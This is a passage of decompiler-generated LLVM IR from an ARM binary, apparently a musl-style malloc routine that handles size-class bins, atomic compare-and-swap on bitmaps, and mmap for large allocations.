  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* @r2, align 4
  store i32 %v2_bc54, i32* %r0.global-to-local, align 4
  %v3_bc64 = call i32 @__a_cas(i32 %v2_bc54, i32 1, i32 ptrtoint (i32* @global_var_238e4.465 to i32))
  store i32 %v3_bc64, i32* %r0.global-to-local, align 4
  %v2_bc68 = icmp eq i32 %v3_bc64, 0
  store i1 %v2_bc68, i1* @cpsr_z, align 1
  br i1 %v2_bc68, label %dec_label_pc_bc38, label %dec_label_pc_bc70

dec_label_pc_bc70:                                ; preds = %dec_label_pc_bc54
  %v2_bc70 = load i32, i32* @global_var_238e4.465, align 4
  store i32 %v2_bc70, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* @r2, align 4
  store i32 %v2_bc70, i32* %r0.global-to-local, align 4
  %v3_bc80 = call i32 @__a_cas(i32 %v2_bc70, i32 1, i32 ptrtoint (i32* @global_var_238e4.465 to i32))
  store i32 %v3_bc80, i32* %r0.global-to-local, align 4
  %v2_bc84 = icmp eq i32 %v3_bc80, 0
  store i1 %v2_bc84, i1* @cpsr_z, align 1
  br i1 %v2_bc84, label %dec_label_pc_bc38, label %dec_label_pc_bc54

dec_label_pc_bc90:                                ; preds = %entry
  %v1_bc90 = add i32 %v0_b8f0, 23
  %v1_bc94 = and i32 %v1_bc90, -16
  store i32 %v1_bc94, i32* %r3.global-to-local, align 4
  %tmp84 = icmp ugt i32 %v1_bc94, 114688
  br i1 %tmp84, label %dec_label_pc_bf08, label %dec_label_pc_bca4

dec_label_pc_bca4:                                ; preds = %dec_label_pc_bc90
  %v3_bca4 = udiv i32 %v1_bc90, 16
  store i32 %v3_bca4, i32* %r3.global-to-local, align 4
  %v1_bca8 = add nsw i32 %v3_bca4, -1
  store i32 %v1_bca8, i32* %r0.global-to-local, align 4
  %tmp85 = icmp ult i32 %v1_bca8, 33
  br i1 %tmp85, label %.thread44, label %dec_label_pc_bcb8

.thread44:                                        ; preds = %dec_label_pc_bca4
  store i32 %v1_bca8, i32* @sb, align 4
  br label %dec_label_pc_b914

dec_label_pc_bcb8:                                ; preds = %dec_label_pc_bca4
  %v1_bcc0 = add nuw nsw i32 %v3_bca4, 2097150
  %v3_bcc4 = udiv i32 %v1_bcc0, 2097152
  store i32 %v3_bcc4, i32* %r0.global-to-local, align 4
  %v1_bcc8 = add nsw i32 %v3_bcc4, -496
  store i32 %v1_bcc8, i32* @sb, align 4
  br label %dec_label_pc_b914

dec_label_pc_bcd0:                                ; preds = %dec_label_pc_bb70
  store i32 %v0_bcd4, i32* %ip.global-to-local, align 4
  %v2_bcd4 = sub i32 %v1_bb74, %v0_bcd4
  %v1_bcd8 = or i32 %v2_bcd4, 1
  store i32 %v1_bcd8, i32* @r3, align 4
  %v1_bcdc = load i32, i32* @r8, align 4
  %v2_bcdc = add i32 %v1_bcdc, %v0_bcd4
  store i32 %v2_bcdc, i32* %r0.global-to-local, align 4
  %v1_bce0 = or i32 %v0_bcd4, 1
  store i32 %v1_bce0, i32* @r2, align 4
  %v2_bce4 = add i32 %v2_bcdc, 4
  %v3_bce4 = inttoptr i32 %v2_bce4 to i32*
  store i32 %v1_bcd8, i32* %v3_bce4, align 4
  %v0_bce8 = load i32, i32* @r2, align 4
  %v1_bce8 = load i32, i32* %ip.global-to-local, align 4
  %v2_bce8 = load i32, i32* @r8, align 4
  %v3_bce8 = add i32 %v2_bce8, %v1_bce8
  %v4_bce8 = inttoptr i32 %v3_bce8 to i32*
  store i32 %v0_bce8, i32* %v4_bce8, align 4
  %v0_bcec = load i32, i32* @r2, align 4
  %v1_bcec = load i32, i32* @r5, align 4
  %v2_bcec = add i32 %v1_bcec, 4
  %v3_bcec = inttoptr i32 %v2_bcec to i32*
  store i32 %v0_bcec, i32* %v3_bcec, align 4
  %v0_bcf0 = load i32, i32* @r3, align 4
  %v1_bcf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_bcf0 = load i32, i32* @r8, align 4
  %v3_bcf0 = add i32 %v2_bcf0, %v1_bcf0
  %v4_bcf0 = inttoptr i32 %v3_bcf0 to i32*
  store i32 %v0_bcf0, i32* %v4_bcf0, align 4
  %v0_bcf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 8
  store i32 %v1_bcf4, i32* %r0.global-to-local, align 4
  %v1_bcf8 = call i32 @free(i32 %v1_bcf4)
  store i32 %v1_bcf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb88

dec_label_pc_bd00:                                ; preds = %dec_label_pc_ba00
  %v1_bd00 = add i32 %v0_bd00, -39
  %v3_bd00 = sub i32 38, %v0_bd00
  %v4_bd00 = and i32 %v3_bd00, %v0_bd00
  %v5_bd00 = icmp slt i32 %v4_bd00, 0
  %v6_bd00 = icmp slt i32 %v1_bd00, 0
  %v7_bd00 = icmp eq i32 %v0_bd00, 39
  %v3_bd04 = xor i1 %v6_bd00, %v5_bd00
  %v4_bd04 = or i1 %v7_bd00, %v3_bd04
  br i1 %v4_bd04, label %dec_label_pc_bd54, label %dec_label_pc_bd08

dec_label_pc_bd08:                                ; preds = %dec_label_pc_bd00
  %v0_bd08 = load i32, i32* @sb, align 4
  %v1_bd08 = add i32 %v0_bd08, 3
  store i32 %v1_bd08, i32* %r3.global-to-local, align 4
  %v2_bd0c = sub i32 %v1_bd08, %v0_bd00
  %v4_bd0c = xor i32 %v1_bd08, %v0_bd00
  %v5_bd0c = xor i32 %v2_bd0c, %v1_bd08
  %v6_bd0c = and i32 %v5_bd0c, %v4_bd0c
  %v7_bd0c = icmp slt i32 %v6_bd0c, 0
  %v8_bd0c = icmp slt i32 %v2_bd0c, 0
  %v9_bd0c = icmp eq i32 %v1_bd08, %v0_bd00
  %v3_bd10 = xor i1 %v8_bd0c, %v7_bd0c
  %v4_bd10 = or i1 %v9_bd0c, %v3_bd10
  br i1 %v4_bd10, label %dec_label_pc_bd14, label %dec_label_pc_be20

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bd08
  %v1_bd14 = add i32 %v7_b9dc, 4
  %v2_bd14 = inttoptr i32 %v1_bd14 to i32*
  %v3_bd14 = load i32, i32* %v2_bd14, align 4
  store i32 %v3_bd14, i32* %r3.global-to-local, align 4
  store i32 %v0_bcd4, i32* %r2.global-to-local, align 4
  %v1_bd1c = and i32 %v3_bd14, -2
  store i32 %v1_bd1c, i32* @r7, align 4
  %v2_bd20 = sub i32 %v1_bd1c, %v0_bcd4
  store i32 %v2_bd20, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_be28, %dec_label_pc_bd14
  %v0_bd24 = phi i32 [ %v2_be34, %dec_label_pc_be28 ], [ %v2_bd20, %dec_label_pc_bd14 ]
  %v3_bd24 = udiv i32 %v0_bd24, 16
  store i32 %v3_bd24, i32* %r3.global-to-local, align 4
  %v1_bd28 = add nsw i32 %v3_bd24, -1
  store i32 %v1_bd28, i32* %r0.global-to-local, align 4
  %tmp86 = icmp ult i32 %v1_bd28, 33
  br i1 %tmp86, label %dec_label_pc_bd54, label %dec_label_pc_bd34

dec_label_pc_bd34:                                ; preds = %dec_label_pc_bd24
  %tmp87 = icmp ugt i32 %v1_bd28, 7168
  br i1 %tmp87, label %dec_label_pc_bd4c, label %dec_label_pc_bd40

dec_label_pc_bd40:                                ; preds = %dec_label_pc_bd34
  %v3_bd44 = udiv i32 %v1_bd28, 2097152
  %v1_bd48 = add nsw i32 %v3_bd44, -496
  br label %dec_label_pc_bd4c

dec_label_pc_bd4c:                                ; preds = %dec_label_pc_bd34, %dec_label_pc_bd40
  %storemerge49 = phi i32 [ %v1_bd48, %dec_label_pc_bd40 ], [ 63, %dec_label_pc_bd34 ]
  store i32 %storemerge49, i32* %r0.global-to-local, align 4
  %v9_bd4c = icmp eq i32 %v0_bd00, %storemerge49
  br i1 %v9_bd4c, label %dec_label_pc_bec8, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_be20, %dec_label_pc_be28, %dec_label_pc_bd4c, %dec_label_pc_bd24, %dec_label_pc_bd00
  %v1_bd54 = add i32 %v7_b9dc, 8
  store i32 %v1_bd54, i32* %r3.global-to-local, align 4
  %v1_bd58 = inttoptr i32 %v1_bd54 to i32*
  %v2_bd58 = load i32, i32* %v1_bd58, align 4
  store i32 %v2_bd58, i32* %r3.global-to-local, align 4
  %v3_bd58 = add i32 %v7_b9dc, 12
  %v4_bd58 = inttoptr i32 %v3_bd58 to i32*
  %v5_bd58 = load i32, i32* %v4_bd58, align 4
  store i32 %v5_bd58, i32* %ip.global-to-local, align 4
  %v9_bd5c = icmp eq i32 %v5_bd58, %v2_bd58
  br i1 %v9_bd5c, label %dec_label_pc_be58, label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd54, %dec_label_pc_bebc
  %v1_bd6c = phi i32 [ %v5_bd58, %dec_label_pc_bd54 ], [ %v5_bec0, %dec_label_pc_bebc ]
  %v0_bd6c = phi i32 [ %v2_bd58, %dec_label_pc_bd54 ], [ %v2_bec0, %dec_label_pc_bebc ]
  %v0_bd64 = phi i32 [ %v7_b9dc, %dec_label_pc_bd54 ], [ %v0_bebc, %dec_label_pc_bebc ]
  %v1_bd64 = add i32 %v0_bd64, 4
  %v2_bd64 = inttoptr i32 %v1_bd64 to i32*
  %v3_bd64 = load i32, i32* %v2_bd64, align 4
  %v1_bd68 = or i32 %v3_bd64, 1
  store i32 %v1_bd68, i32* %r2.global-to-local, align 4
  %v2_bd6c = add i32 %v1_bd6c, 8
  %v3_bd6c = inttoptr i32 %v2_bd6c to i32*
  store i32 %v0_bd6c, i32* %v3_bd6c, align 4
  %v0_bd70 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd70 = and i32 %v0_bd70, -2
  store i32 %v1_bd70, i32* @r0, align 4
  %v1_bd74 = load i32, i32* @r5, align 4
  %v2_bd74 = add i32 %v1_bd74, %v1_bd70
  %v3_bd74 = inttoptr i32 %v2_bd74 to i32*
  %v4_bd74 = load i32, i32* %v3_bd74, align 4
  store i32 %v4_bd74, i32* %r3.global-to-local, align 4
  %v1_bd78 = add i32 %v1_bd74, 8
  %v2_bd78 = inttoptr i32 %v1_bd78 to i32*
  %v3_bd78 = load i32, i32* %v2_bd78, align 4
  store i32 %v3_bd78, i32* %r1.global-to-local, align 4
  %v1_bd7c = or i32 %v4_bd74, 1
  store i32 %v1_bd7c, i32* %r3.global-to-local, align 4
  %v0_bd80 = load i32, i32* %ip.global-to-local, align 4
  %v2_bd80 = add i32 %v3_bd78, 12
  %v3_bd80 = inttoptr i32 %v2_bd80 to i32*
  store i32 %v0_bd80, i32* %v3_bd80, align 4
  %v0_bd84 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd84 = load i32, i32* @r0, align 4
  %v2_bd84 = load i32, i32* @r5, align 4
  %v3_bd84 = add i32 %v2_bd84, %v1_bd84
  %v4_bd84 = inttoptr i32 %v3_bd84 to i32*
  store i32 %v0_bd84, i32* %v4_bd84, align 4
  %v0_bd88 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd88 = load i32, i32* @r5, align 4
  %v2_bd88 = add i32 %v1_bd88, 4
  %v3_bd88 = inttoptr i32 %v2_bd88 to i32*
  store i32 %v0_bd88, i32* %v3_bd88, align 4
  %v0_bd8c = load i32, i32* @r5, align 4
  store i32 %v0_bd8c, i32* @r8, align 4
  br label %dec_label_pc_bd90

dec_label_pc_bd90:                                ; preds = %dec_label_pc_bec8, %dec_label_pc_bd64
  %v0_bd90 = load i32, i32* @r6, align 4
  %v1_bd90 = add i32 %v0_bd90, 8
  store i32 %v1_bd90, i32* @r2, align 4
  %v1_bd94 = load i32, i32* @sl, align 4
  %v2_bd94 = add i32 %v1_bd94, %v1_bd90
  %v3_bd94 = inttoptr i32 %v2_bd94 to i32*
  %v4_bd94 = load i32, i32* %v3_bd94, align 4
  store i32 %v4_bd94, i32* %r3.global-to-local, align 4
  %v2_bd98 = icmp eq i32 %v4_bd94, 0
  store i1 %v2_bd98, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r1, align 4
  store i32 %v2_bd94, i32* @r4, align 4
  br i1 %v2_bd98, label %dec_label_pc_bb70, label %dec_label_pc_bda8

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bd90
  %v0_bda8 = call i32 @__a_barrier()
  store i32 %v0_bda8, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_bdb0 = load i32, i32* @r2, align 4
  %v2_bdb0 = load i32, i32* @r1, align 4
  %v3_bdb0 = add i32 %v2_bdb0, %v1_bdb0
  %v4_bdb0 = inttoptr i32 %v3_bdb0 to i32*
  store i32 0, i32* %v4_bdb0, align 4
  %v0_bdb4 = call i32 @__a_barrier()
  store i32 %v0_bdb4, i32* %r0.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r6, align 4
  %v1_bdb8 = add i32 %v0_bdb8, 12
  store i32 %v1_bdb8, i32* %r3.global-to-local, align 4
  %v1_bdbc = load i32, i32* @r1, align 4
  %v2_bdbc = add i32 %v1_bdbc, %v1_bdb8
  %v3_bdbc = inttoptr i32 %v2_bdbc to i32*
  %v4_bdbc = load i32, i32* %v3_bdbc, align 4
  store i32 %v4_bdbc, i32* %r2.global-to-local, align 4
  %v2_bdc0 = icmp eq i32 %v4_bdbc, 0
  br i1 %v2_bdc0, label %dec_label_pc_bb70, label %dec_label_pc_bdc8

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bda8
  store i32 240, i32* @r7, align 4
  %v0_bdcc = load i32, i32* @r4, align 4
  store i32 %v0_bdcc, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_bde0 = icmp eq i32 %v0_bdcc, -38
  br i1 %v4_bde0, label %dec_label_pc_bde4, label %dec_label_pc_bb70

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bdc8
  store i32 -38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bb70

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bb10
  store i32 240, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  store i32 %v0_be00, i32* %r2.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32 -38), label %dec_label_pc_bb2c, label %dec_label_pc_be10

dec_label_pc_be10:                                ; preds = %dec_label_pc_bdf4
  store i32 %v0_be00, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb2c

dec_label_pc_be20:                                ; preds = %dec_label_pc_bd08
  %v7_be20 = icmp eq i32 %v0_bd00, 63
  br i1 %v7_be20, label %dec_label_pc_be28, label %dec_label_pc_bd54

dec_label_pc_be28:                                ; preds = %dec_label_pc_be20
  %v1_be28 = add i32 %v7_b9dc, 4
  %v2_be28 = inttoptr i32 %v1_be28 to i32*
  %v3_be28 = load i32, i32* %v2_be28, align 4
  store i32 %v3_be28, i32* %r3.global-to-local, align 4
  store i32 %v0_bcd4, i32* %r1.global-to-local, align 4
  %v1_be30 = and i32 %v3_be28, -2
  store i32 %v1_be30, i32* @r7, align 4
  %v2_be34 = sub i32 %v1_be30, %v0_bcd4
  store i32 %v2_be34, i32* %r4.global-to-local, align 4
  %tmp88 = icmp ult i32 %v2_be34, 114689
  br i1 %tmp88, label %dec_label_pc_bd54, label %dec_label_pc_bd24

dec_label_pc_be44:                                ; preds = %dec_label_pc_baac
  %v2_be44 = load i32, i32* @global_var_238e4.465, align 4
  store i32 %v2_be44, i32* @r3, align 4
  %v2_be48 = icmp eq i32 %v2_be44, 0
  store i1 %v2_be48, i1* @cpsr_z, align 1
  br i1 %v2_be48, label %dec_label_pc_be50, label %dec_label_pc_bf7c

dec_label_pc_be50:                                ; preds = %.thread18, %dec_label_pc_be44, %dec_label_pc_bf94, %dec_label_pc_bf7c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_be58:                                ; preds = %dec_label_pc_bd54
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_be5c = sub i32 32, %v0_bd00
  store i32 %v1_be5c, i32* %r1.global-to-local, align 4
  %v7_be64 = lshr i32 1, %v1_be5c
  store i32 %v7_be64, i32* %r4.global-to-local, align 4
  %v1_be68 = add i32 %v0_bd00, -32
  store i32 %v1_be68, i32* %r0.global-to-local, align 4
  %v6_be68 = icmp slt i32 %v1_be68, 0
  %v7_be68 = icmp eq i32 %v0_bd00, 32
  store i1 %v7_be68, i1* @cpsr_z, align 1
  %v6_be6c = shl i32 1, %v0_bd00
  store i32 %v6_be6c, i32* %r3.global-to-local, align 4
  br i1 %v6_be68, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_be58
  %v7_be70 = shl i32 1, %v1_be68
  store i32 %v7_be70, i32* %r4.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_be58, %bb69
  %v0_be7c = phi i32 [ %v7_be64, %dec_label_pc_be58 ], [ %v7_be70, %bb69 ]
  %v1_be74 = sub i32 -1, %v6_be6c
  store i32 %v1_be74, i32* @r7, align 4
  %v1_be7c = sub i32 -1, %v0_be7c
  store i32 %v1_be7c, i32* %r8.global-to-local, align 4
  store i32 %v1_be74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_be84

dec_label_pc_be84:                                ; preds = %dec_label_pc_be84.dec_label_pc_be84_crit_edge, %bb70
  %v1_be8c = phi i32 [ %v1_be8c.pre, %dec_label_pc_be84.dec_label_pc_be84_crit_edge ], [ %v1_be74, %bb70 ]
  %v2_be84 = load i32, i32* @global_var_238f0.447, align 4
  store i32 %v2_be84, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r2, align 4
  %v2_be8c = and i32 %v2_be84, %v1_be8c
  store i32 %v2_be8c, i32* %r1.global-to-local, align 4
  %v3_be90 = call i32 @__a_cas(i32 %v2_be84, i32 %v2_be8c, i32 ptrtoint (i32* @global_var_238f0.447 to i32))
  store i32 %v3_be90, i32* %r0.global-to-local, align 4
  %v2_be94 = icmp eq i32 %v3_be90, 0
  store i1 %v2_be94, i1* @cpsr_z, align 1
  br i1 %v2_be94, label %dec_label_pc_be9c, label %dec_label_pc_be84.dec_label_pc_be84_crit_edge

dec_label_pc_be84.dec_label_pc_be84_crit_edge:    ; preds = %dec_label_pc_be84
  %v1_be8c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_be84

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be84
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* @sb, align 4
  %v0_bea0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_bea0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bea4

dec_label_pc_bea4:                                ; preds = %dec_label_pc_bea4.dec_label_pc_bea4_crit_edge, %dec_label_pc_be9c
  %v1_beac = phi i32 [ %v1_beac.pre, %dec_label_pc_bea4.dec_label_pc_bea4_crit_edge ], [ %v0_bea0, %dec_label_pc_be9c ]
  %v2_bea4 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v2_bea4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_238f4.449 to i32), i32* @r2, align 4
  %v2_beac = and i32 %v2_bea4, %v1_beac
  store i32 %v2_beac, i32* %r1.global-to-local, align 4
  %v3_beb0 = call i32 @__a_cas(i32 %v2_bea4, i32 %v2_beac, i32 ptrtoint (i32* @global_var_238f4.449 to i32))
  store i32 %v3_beb0, i32* %r0.global-to-local, align 4
  %v2_beb4 = icmp eq i32 %v3_beb0, 0
  store i1 %v2_beb4, i1* @cpsr_z, align 1
  br i1 %v2_beb4, label %dec_label_pc_bebc, label %dec_label_pc_bea4.dec_label_pc_bea4_crit_edge

dec_label_pc_bea4.dec_label_pc_bea4_crit_edge:    ; preds = %dec_label_pc_bea4
  %v1_beac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bea4

dec_label_pc_bebc:                                ; preds = %dec_label_pc_bea4
  %v0_bebc = load i32, i32* @r5, align 4
  %v1_bebc = add i32 %v0_bebc, 8
  store i32 %v1_bebc, i32* %r3.global-to-local, align 4
  %v1_bec0 = inttoptr i32 %v1_bebc to i32*
  %v2_bec0 = load i32, i32* %v1_bec0, align 4
  store i32 %v2_bec0, i32* %r3.global-to-local, align 4
  %v3_bec0 = add i32 %v0_bebc, 12
  %v4_bec0 = inttoptr i32 %v3_bec0 to i32*
  %v5_bec0 = load i32, i32* %v4_bec0, align 4
  store i32 %v5_bec0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bd4c
  store i32 %v0_bcd4, i32* %ip.global-to-local, align 4
  %v1_becc = add i32 %v7_b9dc, 12
  %v2_becc = inttoptr i32 %v1_becc to i32*
  %v3_becc = load i32, i32* %v2_becc, align 4
  store i32 %v3_becc, i32* @r0, align 4
  %v1_bed0 = add i32 %v7_b9dc, 8
  %v2_bed0 = inttoptr i32 %v1_bed0 to i32*
  %v3_bed0 = load i32, i32* %v2_bed0, align 4
  store i32 %v3_bed0, i32* %r2.global-to-local, align 4
  %v2_bed4 = add i32 %v7_b9dc, %v0_bcd4
  store i32 %v2_bed4, i32* %r3.global-to-local, align 4
  %v2_bed8 = add i32 %v2_bed4, 8
  %v3_bed8 = inttoptr i32 %v2_bed8 to i32*
  store i32 %v3_bed0, i32* %v3_bed8, align 4
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = load i32, i32* @r0, align 4
  %v2_bedc = add i32 %v1_bedc, 8
  %v3_bedc = inttoptr i32 %v2_bedc to i32*
  store i32 %v0_bedc, i32* %v3_bedc, align 4
  %v0_bee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bee0 = add i32 %v0_bee0, 8
  %v2_bee0 = inttoptr i32 %v1_bee0 to i32*
  %v3_bee0 = load i32, i32* %v2_bee0, align 4
  store i32 %v3_bee0, i32* %r1.global-to-local, align 4
  %v0_bee4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bee4 = or i32 %v0_bee4, 1
  store i32 %v1_bee4, i32* %r2.global-to-local, align 4
  %v0_bee8 = load i32, i32* @r5, align 4
  store i32 %v0_bee8, i32* @r8, align 4
  %v0_beec = load i32, i32* %r4.global-to-local, align 4
  %v2_beec = add i32 %v0_bee0, 4
  %v3_beec = inttoptr i32 %v2_beec to i32*
  store i32 %v0_beec, i32* %v3_beec, align 4
  %v0_bef0 = load i32, i32* @r0, align 4
  %v1_bef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_bef0 = add i32 %v1_bef0, 12
  %v3_bef0 = inttoptr i32 %v2_bef0 to i32*
  store i32 %v0_bef0, i32* %v3_bef0, align 4
  %v0_bef4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bef4 = load i32, i32* @r5, align 4
  %v2_bef4 = load i32, i32* %ip.global-to-local, align 4
  %v3_bef4 = add i32 %v2_bef4, %v1_bef4
  %v4_bef4 = inttoptr i32 %v3_bef4 to i32*
  store i32 %v0_bef4, i32* %v4_bef4, align 4
  %v0_bef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_bef8 = load i32, i32* @r5, align 4
  %v2_bef8 = add i32 %v1_bef8, 4
  %v3_bef8 = inttoptr i32 %v2_bef8 to i32*
  store i32 %v0_bef8, i32* %v3_bef8, align 4
  %v0_befc = load i32, i32* %r3.global-to-local, align 4
  %v1_befc = load i32, i32* %r1.global-to-local, align 4
  %v2_befc = add i32 %v1_befc, 12
  %v3_befc = inttoptr i32 %v2_befc to i32*
  store i32 %v0_befc, i32* %v3_befc, align 4
  %v0_bf00 = load i32, i32* %r4.global-to-local, align 4
  %v1_bf00 = load i32, i32* @r7, align 4
  %v2_bf00 = load i32, i32* @r5, align 4
  %v3_bf00 = add i32 %v2_bf00, %v1_bf00
  %v4_bf00 = inttoptr i32 %v3_bf00 to i32*
  store i32 %v0_bf00, i32* %v4_bf00, align 4
  br label %dec_label_pc_bd90

dec_label_pc_bf08:                                ; preds = %dec_label_pc_bc90
  %v1_bf0c = add i32 %v1_bc94, 4103
  %v1_bf14 = and i32 %v1_bf0c, -4096
  store i32 %v1_bf14, i32* @r6, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 %v1_bf14, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_bf40 = call i32 @__mmap(i32 0, i32 %v1_bf14, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_bf40, i32* %r0.global-to-local, align 4
  %v3_bf44 = icmp eq i32 %v7_bf40, -1
  %v8_bf44 = icmp eq i32 %v7_bf40, -1
  br i1 %v8_bf44, label %.thread18, label %bb71

bb71:                                             ; preds = %dec_label_pc_bf08
  %v2_bf48 = add i32 %v7_bf40, 8
  store i32 %v2_bf48, i32* @r3, align 4
  %v1_bf4c = load i32, i32* @r6, align 4
  %v2_bf4c = add i32 %v1_bf4c, -8
  store i32 %v2_bf4c, i32* %r1.global-to-local, align 4
  %v2_bf54 = add i32 %v7_bf40, 16
  store i32 %v2_bf54, i32* @ip, align 4
  %v4_bf58 = inttoptr i32 %v2_bf48 to i32*
  store i32 8, i32* %v4_bf58, align 4
  %v1_bf5c = load i32, i32* %r1.global-to-local, align 4
  %v2_bf5c = load i32, i32* @r3, align 4
  %v3_bf5c = add i32 %v2_bf5c, 4
  %v4_bf5c = inttoptr i32 %v3_bf5c to i32*
  store i32 %v1_bf5c, i32* %v4_bf5c, align 4
  br label %.thread18

.thread18:                                        ; preds = %dec_label_pc_bf08, %bb71
  br i1 %v3_bf44, label %dec_label_pc_be50, label %dec_label_pc_bb8c

dec_label_pc_bf68:                                ; preds = %dec_label_pc_b900
  %v0_bf68 = call i32 @__errno_location()
  store i32 %v0_bf68, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* @ip, align 4
  %v2_bf74 = inttoptr i32 %v0_bf68 to i32*
  store i32 12, i32* %v2_bf74, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_bf7c:                                ; preds = %dec_label_pc_be44
  %v0_bf7c = call i32 @__a_barrier()
  store i32 %v0_bf7c, i32* @r0, align 4
  %v0_bf80 = load i32, i32* @r4, align 4
  %v1_bf80 = load i32, i32* @r6, align 4
  %v2_bf80 = inttoptr i32 %v1_bf80 to i32*
  store i32 %v0_bf80, i32* %v2_bf80, align 4
  %v0_bf84 = call i32 @__a_barrier()
  store i32 %v0_bf84, i32* %r0.global-to-local, align 4
  %v3_bf88 = load i32, i32* @global_var_238e8.468, align 4
  store i32 %v3_bf88, i32* @r3, align 4
  %v2_bf8c = icmp eq i32 %v3_bf88, 0
  br i1 %v2_bf8c, label %dec_label_pc_be50, label %dec_label_pc_bf94

dec_label_pc_bf94:                                ; preds = %dec_label_pc_bf7c
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  br i1 icmp ne (i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32 -38), label %dec_label_pc_be50, label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_bf94
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_bfbc = load i32, i32* @r4, align 4
  store i32 %v0_bfbc, i32* @ip, align 4
  br label %dec_label_pc_bb8c

; uselistorder directives
  uselistorder i32 %v7_bf40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_bec0, { 1, 0 }
  uselistorder i32 %v2_bec0, { 1, 0 }
  uselistorder i32 %v0_bebc, { 1, 2, 0 }
  uselistorder i32 %v2_bea4, { 1, 0, 2 }
  uselistorder i32 %v2_be84, { 1, 0, 2 }
  uselistorder i32 %v1_be74, { 2, 1, 0 }
  uselistorder i32 %v1_be68, { 0, 2, 1 }
  uselistorder i32 %v2_be34, { 0, 2, 1 }
  uselistorder i32 %v1_bd74, { 1, 0 }
  uselistorder i32 %v1_bd28, { 2, 0, 1, 3 }
  uselistorder i32 %v3_bd24, { 1, 0 }
  uselistorder i32 %v2_bd0c, { 1, 0 }
  uselistorder i32 %v1_bd08, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_bcc8, { 1, 0 }
  uselistorder i32 %v3_bcc4, { 1, 0 }
  uselistorder i32 %v1_bca8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_bca4, { 2, 1, 0 }
  uselistorder i32 %v1_bc94, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_bbc4, { 1, 2, 0 }
  uselistorder i32 %v1_bb38, { 0, 2, 1, 3 }
  uselistorder i32 %v2_baf0, { 1, 0, 2 }
  uselistorder i32 %v2_bab0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v2_ba84, { 0, 2, 1 }
  uselistorder i32 %v2_ba80, { 0, 2, 1 }
  uselistorder i32 %v4_b9e8, { 1, 0 }
